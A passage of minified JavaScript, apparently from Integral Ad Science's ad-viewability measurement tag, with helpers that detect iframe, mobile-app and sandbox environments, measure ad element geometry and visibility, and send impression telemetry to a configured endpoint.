      var n = "undefined" == typeof window,
        r = function () {
          return n;
        },
        i = void 0 !== t && "undefined" != typeof top && t !== top,
        o = function () {
          var e = !1;
          if (r()) e = !0;else try {
            e = !!top.document;
          } catch (e) {}
          return e;
        }(),
        a = function () {
          return r() || I.isDef(We.getWindow().mraid);
        },
        s = function () {
          return !r() && I.isDef(We.getWindow().mraid);
        },
        c = function () {
          var e = !1;
          if (!r()) {
            var t = We.getWindow().inmobi,
              n = t && t.IASDocumentVideoBuffer,
              i = t && n && I.isFunction(n.addVideoEventListener);
            e = s() && !!i;
          }
          return e;
        },
        u = function () {
          return -1 !== e.mode.indexOf("jsvid") || (t = T.getAggregator(), n = t.request(x.OMID_VERIFICATION_CLIENT), r = !1, i = t.request(x.OMID_AD_SESSION_CONTEXT), n && i && (r = i.mediaType === A.MEDIA_TYPE.VIDEO), r) || c();
          var t, n, r, i;
        },
        d = function () {
          return !1 === e.fwMonitoring || "false" === e.fwMonitoring;
        },
        f = function () {
          return e[W.MOB_OR_TAB];
        },
        l = function (t) {
          if (!1 === I(e.customViewability).isArray()) return !1;
          return I(e.customViewability).filter(function (e, n) {
            return Xe.contains(n.id, t);
          }).length > 0;
        },
        E = function () {
          return e.use100v;
        },
        p = function () {
          return l("grpm") || E();
        },
        m = function () {
          return I.isStr(e.iasProxyPartnerDomain) && -1 !== e.iasProxyPartnerDomain.indexOf("bing");
        };
      return {
        embedded: i,
        friendly: o,
        isFriendlyToParent: function (e) {
          var t, n;
          if (r()) t = !0;else {
            try {
              n = se(e.document.referrer).hostname === e.location.hostname;
            } catch (e) {}
            t = n;
          }
          return t;
        },
        friendlyIframe: i && o,
        xDomainIframe: i && !o,
        getTagTime: function () {
          return We.now() - g.measurementConfig.birthdate;
        },
        getPageTime: function () {
          var e = A.NA;
          return !r() && I.isDef(t.chrome) && I.isDef(t.chrome.csi) && I.isFunction(t.chrome.csi) && (e = We.round(t.chrome.csi().pageT)), e;
        },
        isVideo: u,
        isMobileApp: a,
        isSpecifiedAd: function () {
          var t = !1;
          if (!r()) {
            var n = I.isFunction(e.contextNode.getAttribute) && e.contextNode.getAttribute("data-ias-container") || e._cl_adpath;
            t = n && I.isStr(n);
          }
          return t;
        },
        isCompoundAd: function () {
          var t = !1;
          if (!r()) {
            var n = e._cl_adpath,
              i = /\[(.*)\]/.exec(n);
            t = null !== i && 0 !== i[1].length && i[1].split(",").length > 1;
          }
          return t;
        },
        isOmid: function () {
          var t = T.getAggregator().request(x.OMID_VERIFICATION_CLIENT);
          return t && t.isSupported() && !e.videoId;
        },
        isOmidNative: function () {
          return new an().accepts();
        },
        isOmidSandboxedEnvironment: function () {
          return new an().accepts();
        },
        isOmidForWeb: function () {
          return new Lt().accepts();
        },
        isDomless: r,
        isBustedIframe: function () {
          var e = !1;
          return r() || (e = void 0 !== kn()), e;
        },
        isMraid: s,
        isSafeFrame: function () {
          var e = !1;
          return r() || (e = I(We.getWindow().$sf).isObj(!1) && I(We.getWindow().$sf.ext).isObj(!1)), e;
        },
        isInMobiMraidVideo: c,
        isDeviceTypeGroupMobile: f,
        usesIASFullyInViewCustomMetric: function () {
          return l("fiv") || E() || !p();
        },
        usesGroupMCustomMetric: p,
        isCeltra: function () {
          var e = !1;
          return r() || (e = Yn().isApplicable()), e;
        },
        usesGroupMCustomMetricMobilePassThru: function () {
          return p() && f();
        },
        usesZeroPivCustomMetric: function () {
          if (!1 === I(e.customViewability).isArray()) return !1;
          return I(e.customViewability).filter(function (e, t) {
            return I(t.thresholds).findFirst(function (e, t) {
              return 0 === t.piv;
            });
          }).length > 0;
        },
        isRefreshable: function (e) {
          try {
            var t = We.getTop();
            window.addEventListener("message", function (t) {
              /isRefreshable/g.test(t.data) && e(null, t && t.data);
            }, !1), t.postMessage(JSON.stringify({
              requestTop: "isRefreshable"
            }), "*");
          } catch (t) {
            e(t);
          }
        },
        isPossiblyRefreshable: function () {
          return !r() && !a() && !u() && i && "jload" === e.mode;
        },
        integratedBlockingApplies: function (t) {
          var n,
            r,
            i,
            o,
            a = !1;
          e.contextNode && I.isFunction(e.contextNode.getAttribute) && (n = e.contextNode.getAttribute("data-ias-check-tag"), r = e.contextNode.getAttribute("data-ias-check-done"), o = (i = e.contextNode.getAttribute(A.CALLBACK_IDENTIFIER.toString())) && I.isFunction(We.getWindow()[i]));
          var s = I.isDef(JSON) && I.isFunction(JSON.parse),
            c = e.integration && (t.indexOf("skeleton.js") > 0 || t.indexOf("/internal/") > 0),
            u = !0 === e.fwMonitoring || "true" === e.fwMonitoring;
          return s && c && ("true" === n && "true" !== r && o ? (a = !0, u && T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: "imgb"
          }, W.MISMATCH_OF_INTEGRATED_BLOCKING_TAG_TYPES, {
            type: "impression"
          })) : (a = !1, u || T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: "ibgm"
          }, W.MISMATCH_OF_INTEGRATED_BLOCKING_TAG_TYPES, {
            type: "impression"
          }))), a;
        },
        isBlocking: d,
        isBlockingSizmekTag: function () {
          return d() && Xe.contains(e.scriptUrl, "bs.serving-sys.com");
        },
        isAMZN: function () {
          return I.isStr(e.iasProxyPartnerDomain) && -1 !== e.iasProxyPartnerDomain.indexOf("amazon");
        },
        isMSFT: m,
        isPageOnShadowDomWhitelist: function () {
          var t = !1;
          return m() && (t = !0), I.isStr(e.iasProxyPartnerDomain) && -1 !== e.iasProxyPartnerDomain.indexOf("integral.local") && (t = !0), t;
        },
        doesPageAllowAppendedScripts: function () {
          var e = !0;
          return m() && (e = !1), e;
        }
      };
    }(t),
    _e = {
      addEvent: function (e, t, n, r) {
        "use strict";

        I.isDef(e.addEventListener) && ("mouseenter" === t ? e.addEventListener("mouseover", _e.mouseEnter(n), r) : "mouseleave" === t ? e.addEventListener("mouseout", _e.mouseEnter(n), r) : e.addEventListener(t, n, r));
      },
      removeEvent: function (e, t, n) {
        "use strict";

        I.isDef(e.removeEventListener) && ("mouseenter" === t ? (t = "mouseover", n = _e.mouseEnter) : "mouseleave" === t && (t = "mouseout", n = _e.mouseEnter), e.removeEventListener(t, n));
      },
      mouseEnter: function (e) {
        "use strict";

        var t = this;
        return function (n) {
          var r = n.relatedTarget;
          this === r || t.isAChildOf(this, r) || e.call(this, n);
        };
      },
      isAChildOf: function (e, t) {
        "use strict";

        if (e === t) return !1;
        for (; t && t !== e;) t = t.parentNode;
        return t === e;
      },
      getStyle: function (e, t, r) {
        "use strict";

        var i,
          o = "";
        return r = r || "", n.defaultView && n.defaultView.getComputedStyle ? o = (i = n.defaultView.getComputedStyle(e, r)) ? i.getPropertyValue(t) : o : e.currentStyle && (t = t.replace(/\-(\w)/g, function (e, t) {
          return t.toUpperCase();
        }), o = e.currentStyle[t]), o;
      },
      getXHR2: function (e, n) {
        "use strict";

        var r, i;
        return I.isDef(t.XMLHttpRequest) ? "withCredentials" in (i = new XMLHttpRequest()) && (r = i) : I.isDef(XDomainRequest) && (r = new XDomainRequest()), r;
      },
      whenReady: function (e, t) {
        "use strict";

        if (Ae.isDomless()) We.setTimeout(function () {
          e();
        }, 50);else {
          var r,
            i,
            o = t || (Ae.xDomainIframe ? n : We.getTop().document),
            a = this;
          r = e, i = function () {
            r(!0);
          }, I.isFunction(n.addEventListener) ? "complete" == o.readyState || "loaded" == o.readyState || "interactive" == o.readyState ? We.execAtEndOfThread(i) : a.addEvent(o, "DOMContentLoaded", i, !1) : function (e) {
            var t = We.setInterval(function () {
              o.body && (We.clearInterval(t), e());
            }, 50);
          }(r);
        }
      },
      isSandboxed: function (e) {
        "use strict";

        var t,
          n = We.getWindow(),
          r = !1;
        if ("sandbox" in We.getDoc().createElement("iframe")) {
          try {
            t = n.frameElement;
          } catch (e) {}
          r = t ? t.hasAttribute("sandbox") : function () {
            var t = !1,
              n = We.getDoc();
            if (e.browserIs(A.BROWSERS.CHROME)) try {
              n.domain = "hol@#3+~";
            } catch (e) {
              /Assignment is forbidden for sandboxed iframes/.test(e.message) && (t = !0);
            }
            return t;
          }();
        }
        return r;
      },
      styleElement: function (e, t) {
        "use strict";

        if (e && I(e.style).isObj() && I(t).isObj()) {
          var n = "";
          I(t).each(function (e, t) {
            n += e + ": " + t + " !important;";
          }), e.style.cssText = n;
        }
      },
      nodeIsAbsolutelyPositioned: function (e) {
        "use strict";

        return "absolute" === _e.getStyle(e, "position") || e.style && "absolute" === e.style.position;
      }
    },
    De = function (e) {
      "use strict";

      var t,
        n,
        r,
        i,
        o,
        a = De.callTypeCounter,
        s = [A.DT_CODES.ADTALK],
        c = {
          UNLOAD: -1,
          ADTALK: -2,
          VIEWABILITY_READY: -3,
          VIDEO_EVENTS: -4,
          DIAGNOSTIC: -5,
          THIRD_PARTY: -6,
          QUARTILE_FULLY_INVIEW: -7,
          LARGE_BILLABLE: -8,
          SCA: -10,
          ADSERVER_MACROS: -11
        };
      return i = (t = {}, n = A.DT_CODES, I(["UNLOAD", "ADTALK", "VIEWABILITY_READY", "VIDEO_EVENTS", "DIAGNOSTIC", "THIRD_PARTY", "QUARTILE_FULLY_INVIEW", "LARGE_BILLABLE", "SCA", "ADSERVER_MACROS"]).each(function (e, r) {
        t[n[r]] = c[r];
      }), t)[e], o = a && a[e], I.isDef(o) && 0 !== o && I(s).contains(e) && (i = i + "." + o), r = a[e], a[e] = I.isDef(r) ? r + 1 : 1, {
        callType: e,
        enumerator: i
      };
    };
  De.callTypeCounter = {};
  var ve = function (t, n, r, i, o, a, s, c) {
      "use strict";

      var u = 0,
        d = 0,
        g = !1,
        f = function (t, n, a, c, f, l) {
          a = a || !r.on("postDts");
          var E = t === A.DT_CODES.DIAGNOSTIC || t === A.DT_CODES.ADTALK || t === A.DT_CODES.SCA || t === A.DT_CODES.XSCA || t === A.DT_CODES.EXTERNAL || t === A.DT_CODES.LARGE_BILLABLE || t === A.DT_CODES.ADSERVER_MACROS;
          if (i.impressionIsIdentifiable() && (E || "n" !== s.getCurrentLoc())) try {
            var h = e.dtBaseURL,
              _ = new se(h, !0),
              D = We.now();
            T.getAggregator().trigger("preSendDt", t), h || (_.path(A.DATA_TRANSFER_EVENT), r.on("usedtdomain") && _.sub(A.DATA_TRANSFER_EVENT)), p(_, t, n), f && f.field && _.setParam(f.field, f.value), c || m(_, t), T.getAggregator().trigger("send", _, function () {
              d += 1, u = We.now() - D, I.isFunction(l) && l();
            }, a), t === A.DT_CODES.UNLOAD && (g = !0), o.cleanup();
          } catch (e) {
            __IntegralASDiagnosticCall("dt-" + t, e), T.getAggregator().trigger("error", A.ERROR_CODES.PHONE_HOME);
          }
        },
        l = function () {
          if (!g) {
            var e = A.DT_CODES.UNLOAD;
            f(e, -1, !0);
          }
        },
        E = function (t, n) {
          var i = {
              bapi: "a",
              bapiClient: "b",
              jload: "c",
              jss: "d",
              jsi: "e"
            },
            o = e.mode,
            a = i[t] || i[o];
          n = n || o + "Diag", r.on(n) && a && f(A.DT_CODES.DIAGNOSTIC, -5, !0, !0, {
            field: "bkp",
            value: a
          });
        },
        p = function (t, n, r) {
          var a = new De(n),
            s = I.isDef(r) ? r : a.enumerator;
          t.setParam("asId", e.asid);
          var c = {
            c: i.getCacheBustId(),
            pingTime: s,
            time: Ae.getTagTime(),
            type: n
          };
          o.filterOutput(function (e) {
            var t = e.minDt && (!e.type || e.type === n);
            return t && e.oneTime && (e.flagForRemoval = !0), t;
          }, c), t.setParam("tv", c);
        },
        m = function (t, i) {
          var g,
            f,
            l = {};
          o.filterOutput(function (e) {
            return e.standalone && !e.minDt && e.type === i;
          }, function (e, n) {
            t.setParam(e, n.replace(/%3A/g, ":"));
          }), s.fastForward(), function (e) {
            return e === A.DT_CODES.CUSTOM || e === A.DT_CODES.UNLOAD || e === A.DT_CODES.VIDEO_EVENTS || e === A.DT_CODES.FULLY_INVIEW || e === A.DT_CODES.PING || e === A.DT_CODES.VIEWABILITY_READY || e === A.DT_CODES.ADTALK;
          }(i) && (l.clog = c, Ae.isVideo() && (f = Ae.isOmid() ? "omidVideoEventsString" : "videoEventsString", (g = T.getAggregator().request(f)) && !g.isEmpty() && (l.ve = g))), i === A.DT_CODES.UNLOAD && (l.ndt = d), -1 !== e.mode.indexOf("jsvid") && (l.vv = T.getAggregator().request("videoVersion")), l.NULL1 = r.output(), l.NULL2 = s.stringify(10), l.em = Ae.embedded, l.fr = Ae.friendly, l.e = n.toString(), l.tt = e.mode, l.dtt = u, o.filterOutput(function (e) {
            var t = !(e.standalone || e.minDt || e.type && e.type !== i);
            return t && e.oneTime && (e.flagForRemoval = !0), t;
          }, l), t.setParam("tv", l), t.setParam("br", a.getBrowserType());
        };
      return T.getAggregator().on({
        sendDt: function (e, t, n) {
          var r;
          f(e, I.resolve(t), r, r, r, n);
        },
        sendMinDt: function (e, t) {
          f(e, t, void 0, !0);
        },
        sendDiag: E,
        updateDtCount: function () {
          d++;
        },
        unload: l
      }), {
        send: f,
        unload: l,
        diagnostic: E,
        setViewabilityMod: function (e) {
          e;
        }
      };
    },
    Se = function (e) {
      "use strict";

      var n,
        r = {},
        i = !1,
        o = function (e) {
          return 1 === e.nodeType;
        },
        a = function () {
          var t = o(e) ? Oe.nodeIsHidden(e) : 0 === e.width || 0 === e.height;
          return !i && t;
        },
        s = function () {
          var e = {};
          return I(r).each(function (t, n) {
            e[t] = We.round(n);
          }), e;
        },
        c = function (e) {
          return I.isNumeric(e) || I.isUndef(e);
        },
        u = function () {
          return We.round(r.width) * We.round(r.height);
        };
      return e !== t.parent && (o(e) ? I.isDef(e.getBoundingClientRect) && (n = Oe.getRect(e), I(r).mixin({
        x: I.useIfDef(n.x) || n.scrX,
        y: I.useIfDef(n.y) || n.scrY,
        scrX: n.scrX,
        scrY: n.scrY,
        width: n.width,
        height: n.height
      })) : r = e), {
        hasValidDims: function () {
          return c(r.scrX) && c(r.scrY) && I.isNumeric(r.width) && I.isNumeric(r.height);
        },
        toString: function () {
          var e = s();
          return [e.scrX, e.scrY, e.width, e.height].join(".");
        },
        getRounded: s,
        getRoundedGeometry: function () {
          var e = {};
          return I(r).each(function (t, n) {
            e[t] = "x" === t || "y" === t || "width" === t || "height" === t ? We.round(n) : n;
          }), e;
        },
        set: function (e, t) {
          r[e] = t;
        },
        isHidden: a,
        treatAsPlaceholder: function () {
          i = !0;
        },
        area: u,
        isMrcLarge: function () {
          return u() >= A.MRC_LARGE_AD_SIZE;
        },
        isOneByOne: function () {
          return a() && u() <= 1;
        }
      };
    },
    Oe = {
      findElementsWithSize: function (e) {
        "use strict";

        var t = [],
          n = function (e) {
            Oe.getNodeArea(e) < 1 ? I(e.children).each(function (e, t) {
              n(t);
            }) : t.push(e);
          };
        return n(e), t;
      },
      nodeIsHidden: function (e) {
        "use strict";

        var t = this.getRect(e),
          n = 0 !== parseInt(_e.getStyle(e, "width")) && 0 === t.width,
          r = 0 === t.width || 0 === t.height,
          i = "hidden" === _e.getStyle(e, "visibility");
        return n || r || i;
      },
      calcWinDims: function () {
        "use strict";

        var e, t, n;
        try {
          t = Oe.browserWindowPosition(), n = Oe.windowSize(), e = {
            scrX: We.round(t.scrX),
            scrY: We.round(t.scrY),
            width: We.round(n.width),
            height: We.round(n.height)
          };
        } catch (t) {
          T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.GET_WIN_DIMENSIONS), e = {};
        }
        return e;
      },
      windowSize: function () {
        "use strict";

        var e,
          n,
          r,
          i = {};
        if (Ae.isDomless()) return {
          width: 0,
          height: 0
        };
        if (Ae.friendly) {
          if (n = (e = top.document).documentElement, r = e.body, I.isDef(top.innerWidth)) i.width = top.innerWidth, i.height = top.innerHeight;else if (I.isDef(n.clientWidth)) i.width = n.clientWidth, i.height = n.clientHeight;else {
            if (!I.isDef(r.clientWidth)) throw i.width = i.height = 0, "";
            i.width = r.clientWidth, i.height = r.clientHeight;
          }
        } else I.isDef(t.outerWidth) && (i.width = t.outerWidth, i.height = t.outerHeight);
        return i;
      },
      browserWindowPosition: function () {
        "use strict";

        var e = 0,
          n = 0;
        e = t.screenX, n = t.screenY;
        return T.getAggregator().request(x.BROWSER).browserIs(A.BROWSERS.GECKO) && -8 == e && -8 == n && (e += 8, n += 8), {
          scrX: e,
          scrY: n
        };
      },
      getNodeArea: function (e) {
        "use strict";

        var t = -1;
        if (e) {
          var n = Oe.getRect(e);
          t = n.width * n.height;
        }
        return t;
      },
      getRect: function (e) {
        "use strict";

        var t = {},
          n = Oe.browserWindowPosition(),
          r = e.getBoundingClientRect();
        return I.isUndef(r.x) && (t.x = r.left, t.y = r.top), I.isUndef(r.width) && (t.width = r.right - r.left, t.height = r.bottom - r.top), I(t).mixin(r, !0), t.scrX = n.scrX + t.x, t.scrY = n.scrY + t.y, t;
      },
      getPlaceholderSpan: function () {
        "use strict";

        var e = n.createElement("span");
        return I(e.style).mixin({
          width: "0px",
          height: "0px",
          display: "block",
          overflow: "hidden",
          visibiility: "hidden"
        }), e.innerHTML = ".", e;
      },
      createImage: function () {
        "use strict";

        var e = Ae.friendly && We.getTop().Image;
        return I.isFunction(e) ? new e() : new Image();
      },
      createHiddenIframe: function (e) {
        "use strict";

        var t = We.getDoc().createElement("iframe"),
          n = e ? {
            display: "none"
          } : {
            width: "0px",
            height: "0px",
            border: "0",
            position: "absolute",
            top: "-10000px",
            left: "-10000px"
          };
        return _e.styleElement(t, n), t;
      },
      tagNameIs: function (e, t) {
        "use strict";

        return e.tagName.toUpperCase() === t.toUpperCase();
      },
      getClippedDimensions: function (e, t) {
        "use strict";

        var r,
          i,
          o,
          a,
          s,
          c = 1e4,
          u = 1e4,
          d = _e.nodeIsAbsolutelyPositioned(e);
        if (s = !Oe.tagNameIs(e, "OBJECT"), null !== e.parentNode && !d && s && !Oe.tagNameIs(t, "BODY")) {
          a = e;
          do {
            a = a.parentNode, i = !Oe.tagNameIs(a, "OBJECT"), o = "inline" !== _e.getStyle(a, "display"), i && o && (c = (r = Oe.getRect(a)).width < c ? r.width : c, u = r.height < u ? r.height : u);
          } while (a.parentNode !== n && a !== t);
        }
        return {
          width: We.round(c),
          height: We.round(u)
        };
      },
      hasBackgroundImage: function (e) {
        var t = _e.getStyle(e, "background-image");
        return "" !== t && "none" !== t;
      },
      isEmptyFriendlyFrame: function (e) {
        try {
          var t,
            n = !1;
          if (e && e.document) {
            var r = e && "IFRAME" === e.nodeName && e.contentDocument;
            r && (t = r.body) && t.childElementCount < 1 && (n = !0);
          }
          return n;
        } catch (e) {
          return !1;
        }
      },
      findChildWithLargestContent: function (e, t) {
        var n = T.getAggregator().request(x.MOBILE_APP).isMobileAppEnvironment(),
          r = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
          i = r && r.hasOwnProperty("ignoreDivAsCandidate"),
          o = this.hasBackgroundImage,
          a = null,
          s = function (t) {
            var n,
              r,
              a,
              s = null,
              c = -1;
            if (t.length) for (n = 0, r = t.length; n < r; n++) {
              var u = t[n],
                d = Oe.getNodeArea(u),
                g = !((a = u).parentNode === e && "DIV" === a.nodeName && !o(a) && ("0" === _e.getStyle(a, "opacity") || "hidden" === _e.getStyle(a, "visibility") || function () {
                  var e,
                    t,
                    n = a.childNodes;
                  for (e = 0; e < n.length; e++) 1 === n[e].nodeType && (t = !0);
                  return !t;
                }()));
              g && i && "DIV" === u.nodeName && (g = !1);
              var f = Oe.isEmptyFriendlyFrame(u);
              d > c && g && !f && (s = u, c = d);
            }
            return s && (s.hasValidSizeForMobileApp = c > 1), s;
          }(Oe.collectCandidateElements(e, t || "iframe,img,a,object,embed,div".split(",")));
        return s && ((a = function (t) {
          for (var r, o, a = t; t.parentNode !== e && "inline" !== _e.getStyle(t.parentNode, "display");) (!n || (r = t.parentNode, o = void 0, o = !0, ("visible" === _e.getStyle(r, "overflow") || "visible" === _e.getStyle(r, "overflowX") && "visible" === _e.getStyle(r, "overflowY")) && (o = !1), o && Oe.getNodeArea(t.parentNode) > 0)) && (n && i && "DIV" === t.parentNode.nodeName || (a = t.parentNode)), t = t.parentNode;
          return a;
        }(s)).hasValidSizeForMobileApp = s.hasValidSizeForMobileApp), a;
      },
      screenSize: function () {
        "use strict";

        if (Ae.isDomless()) return {
          width: 0,
          height: 0
        };
        var e = {
          width: -1,
          height: -1
        };
        try {
          I.isDef(t.screen) && (e = {
            width: t.screen.width,
            height: t.screen.height
          });
        } catch (e) {}
        return e;
      },
      calcMonDims: function () {
        "use strict";

        var e = I(Oe.screenSize()).mixin({
          scrX: 0,
          scrY: 0
        });
        return I.isDef(screen.availLeft) && (e = {
          scrX: t.screen.availLeft,
          scrY: t.screen.availTop,
          width: t.screen.availWidth,
          height: t.screen.availHeight
        }), e;
      },
      getOurIFrameInTop: function () {
        "use strict";

        for (var e, t = We.getTop(), n = We.getWindow(); n != t;) n = (e = n).parent;
        return e;
      },
      getOurNodeInTop: function () {
        "use strict";

        var t, n;
        return Ae.friendly && (t = Ae.embedded ? (n = Oe.getOurIFrameInTop()) && n.frameElement : e.contextNode), t;
      },
      getAncestorNodes: function (e) {
        "use strict";

        var t = [],
          n = e.ownerDocument && e.ownerDocument.documentElement,
          r = e;
        if (n) for (; r.parentNode !== n;) t.push(r), r = r.parentNode;
        return t;
      },
      getTagsNamed: function (e, t) {
        "use strict";

        var n,
          r = t || We.getDoc();
        try {
          n = r.getElementsByTagName(e);
        } catch (e) {
          n = null;
        }
        return n;
      },
      containsScriptTagWithSrc: function (e) {
        "use strict";

        return !!I(Oe.getTagsNamed("script")).findFirst(function (t, n) {
          var r = n.src;
          return I.isFunction(e) ? e(r) : r === e;
        });
      },
      contains: function (e, t) {
        "use strict";

        var n = !1;
        try {
          n = I.isDef(e) && I.isFunction(e.contains) && e.contains(t);
        } catch (e) {}
        return n;
      },
      querySelector: function (e, t) {
        "use strict";

        var n;
        try {
          n = e.querySelector(t);
        } catch (e) {
          n = null;
        }
        return n;
      },
      nodeIsInWindow: function (e, t) {
        "use strict";

        return e.ownerDocument && (e.ownerDocument.defaultView || e.ownerDocument.parentWindow) === t;
      },
      setAttributeOf: function (e, t, n) {
        "use strict";

        e && I.isFunction(e.setAttribute) && e.setAttribute(t, n);
      },
      removeAttributeOf: function (e, t) {
        "use strict";

        e && I.isFunction(e.removeAttribute) && e.removeAttribute(t);
      },
      crossQuerySelector: function (t, n) {
        "use strict";

        var r,
          i,
          o = [e.contextNode.parentNode, We.getDoc()];
        if (Ae.friendly && o.push(We.getTop().document), n && Ae.embedded) try {
          o.push(We.getWindow().frameElement.ownerDocument);
        } catch (e) {}
        return I(o).each(function (e, n) {
          try {
            i = Oe.querySelector(n, t);
          } catch (e) {}
          !r && i && (r = i);
        }), r;
      },
      getNodeName: function (e) {
        "use strict";

        return e && e.nodeName;
      },
      isWindow: function (e) {
        "use strict";

        var t = !1;
        try {
          t = e && "object" == typeof e && "setInterval" in e;
        } catch (e) {
          t = !0;
        }
        return !!t;
      },
      getChildWindowsOf: function (e) {
        "use strict";

        var t = [],
          n = Oe.getTagsNamed("iframe", e);
        return n && (t = I(n).map(function (e, t) {
          return t.contentWindow;
        })), t;
      },
      getFrameId: function () {
        "use strict";

        var e = We.getWindow().frameElement;
        return e && e.id;
      },
      isViewportVisible: function (e, t) {
        "use strict";

        var n = e.innerWidth,
          r = e.innerHeight,
          i = n * r > t.width * t.height,
          o = n > t.width && r > t.height;
        return i && o;
      },
      getTagName: function (e) {
        "use strict";

        return e.tagName.toLowerCase();
      },
      getAttribute: function (e, t) {
        "use strict";

        return e.getAttribute(t);
      },
      attributeMatches: function (e, t, n) {
        "use strict";

        var r = e && Oe.getAttribute(e, t);
        return n.test(r);
      },
      isImageTag: function (e) {
        "use strict";

        return e && e.src && Oe.tagNameIs(e, "img");
      },
      getDimensionFromStyle: function (e) {
        "use strict";

        var t,
          n = _e.getStyle(e, "width"),
          r = _e.getStyle(e, "height");
        return n && r && (t = {
          width: I.getNum(n),
          height: I.getNum(r)
        }), t;
      },
      getDimensionFromAttributes: function (e) {
        "use strict";

        var t,
          n = Oe.getAttribute(e, "width"),
          r = Oe.getAttribute(e, "height");
        return n && r && (t = {
          width: I.getNum(n),
          height: I.getNum(r)
        }), t;
      },
      traverseAndFindFirstMatchingNode: function e(t, n) {
        "use strict";

        var r, i, o;
        if (n(t)) i = t;else if (o = t.children) for (r = 0; r < o.length && !(i = e(o[r], n)); r++);
        return i;
      },
      getFirstChildElement: function (e) {
        "use strict";

        return e && e.children && e.children[0];
      },
      isClippable: function (e, t) {
        "use strict";

        var n = !0,
          r = "fixed" === _e.getStyle(e, "position"),
          i = !("hidden" === _e.getStyle(t, "overflow")) && !r;
        return Ae.isSpecifiedAd() && (r || i) && (n = !1), n;
      },
      isNodeCreative: function (e) {
        "use strict";

        var t = Oe.getNodeName(e),
          n = e && e.children && 0 === e.children.length,
          r = e && e.innerText && e.innerText.length > 0,
          i = n && r,
          o = t && -1 !== A.RENDER.CREATIVE_NODE_TYPES.indexOf(t.toUpperCase());
        return !!t && !!(o || Oe.hasBackgroundImage(e) || i);
      },
      getElementsDocument: function (e) {
        "use strict";

        return e.ownerDocument || e;
      },
      getElementsWindow: function (e) {
        "use strict";

        var t = Oe.getElementsDocument(e);
        return t.defaultView || t.parentWindow || e;
      },
      elementIsEmbedded: function (e) {
        "use strict";

        return Oe.getElementsWindow(e) !== We.getTop();
      },
      getParent: function (e) {
        "use strict";

        return e.parentNode || e.parent;
      },
      isNodeXDomainIframe: function (e) {
        "use strict";

        var t = !1;
        if (e && "IFRAME" === Oe.getNodeName(e)) try {
          t = !e.contentWindow.document;
        } catch (e) {
          t = !0;
        }
        return t;
      },
      isElement: function (e) {
        "use strict";

        return 1 === e.nodeType;
      },
      collectCandidateElements: function (e, t) {
        var n,
          r,
          i,
          o,
          a = [],
          s = t;
        for (n = 0, r = s.length; n < r; n++) {
          var c = s[n].toLowerCase(),
            u = e.getElementsByTagName && e.getElementsByTagName(c);
          if (u && u.length) for (i = 0, o = u.length; i < o; i++) a.push(u[i]);
        }
        return a;
      }
    },
    Re = function () {
      "use strict";

      var e = {},
        t = function (t) {
          I.isDef(e[t]) ? e[t]++ : e[t] = 1;
        };
      return T.getAggregator().on("error", function (e) {
        var n = I(e).isObj() ? e.errorCode : e;
        t(n);
      }), {
        list: e,
        add: t,
        toString: function () {
          var t = "";
          for (var n in e) e.hasOwnProperty(n) && (t += n);
          return t;
        },
        hasErrors: function () {
          for (var t in e) return !0;
          return !1;
        }
      };
    },
    Ne = function () {
      "use strict";

      return {
        createInstance: function (e, t) {
          return Ae.isDomless() ? new Ce() : new ye(e, t);
        }
      };
    },
    ye = function (t, n) {
      "use strict";

      var r = function (t) {
        var n = [];
        if (!(t && t instanceof Array)) throw new Error("Unexpected data type in ExchangeParser.getUrlList");
        return (n = I(t).map(function (e, t) {
          return t.val;
        })).push(e.adsafeSrc, e.requrl, e.reqquery), n;
      };
      return {
        parse: function (i) {
          try {
            var o,
              a = r(i),
              s = a && a.length && a.join("|"),
              c = e.exchList;
            s && (o = I(c).map(function (e, t) {
              return s.indexOf(Xe.rot(t)) >= 0 ? e : void 0;
            })).length && n.addItem({
              output: o.join(".")
            }, "ex", {
              type: A.IMPRESSION_EVENT
            });
          } catch (e) {
            t.add(A.ERROR_CODES.EXCHANGE_PARSING);
          }
        }
      };
    },
    Ce = function () {
      "use strict";

      return {
        parse: function (e) {}
      };
    };
  const Me = function () {
    "use strict";

    const t = {},
      n = function (n) {
        let r, i, o, a;
        return I.isUndef(t[n]) && (r = e.jsFeatures, t[n] = !1, -1 !== r.indexOf(n) && (i = new RegExp(n + "(?=$|,)|" + n + ":(?!,|$)(.?\\d*(?=,|$))").exec(r), i && (o = i[1], a = !o, t[n] = a || o > 100 * We.random()))), t[n];
      },
      r = {
        es: "everySecond",
        sc: "usesca",
        ha: "usehaps",
        fgad: "forceKeepGoogleAdNode"
      },
      i = {
        fif: "useFIF",
        gmnp: "groupm_native_publisher",
        for: "forceAppend",
        b11: W.B11,
        cnod: W.CNOD
      },
      o = function (t) {
        const n = e[t];
        return I(["integration"]).contains(t) ? !!n : !0 === n || "true" === n || I.isFunction(n);
      };
    I(r).each(function (e, t) {
      n(t);
    });
    return {
      on: n,
      bootstrapOn: o,
      bootstrapperHas: function (t) {
        const n = I.isStr(t) ? [t] : t;
        return I(n).map(function (t, n) {
          const r = n;
          if (r && I.isDef(e[r])) return 1;
        }).length === n.length;
      },
      getEnabledScriptUrl: function (t) {
        const r = n("use" + t),
          i = e.sp_cdnScripts && e.sp_cdnScripts[t];
        return r && i;
      },
      setReportedBootstrapFeatures: function (e, t) {
        i[e] = t;
      },
      reportedBootstrapFeatures: i,
      output: function () {
        return I(function () {
          const e = I(r).mapToObj(function (e, n) {
              const r = {};
              return r[e] = I.fromBoolToNum(t[n]), r;
            }),
            n = I(i).mapToObj(function (e, t) {
              const n = {};
              return n[e] = I.fromBoolToNum(o(t)), n;
            });
          return n.gm = I.fromBoolToNum(Ae.usesGroupMCustomMetric()), I(e).mixin(n);
        }()).toParams();
      }
    };
  };
  var we = function () {
      "use strict";

      A.BROWSERS;
      var e = function (e, t) {
        var n = e.getRounded(),
          r = t.getRounded(),
          i = Math.max(n.scrX, r.scrX),
          o = Math.max(n.scrY, r.scrY),
          a = Math.min(n.scrX + n.width, r.scrX + r.width) - i,
          s = Math.min(n.scrY + n.height, r.scrY + r.height) - o;
        return Se({
          scrX: i,
          scrY: o,
          width: a > 0 ? a : 0,
          height: s > 0 ? s : 0
        });
      };
      return {
        calcInitialViewState: function (e, t) {
          var n,
            r = A.NA;
          return n = t ? {
            IN_VIEW: 65,
            OUT_OF_VIEW: 25,
            PARTIAL_VIEW: 30
          } : {
            IN_VIEW: 75,
            OUT_OF_VIEW: 25,
            PARTIAL_VIEW: 50
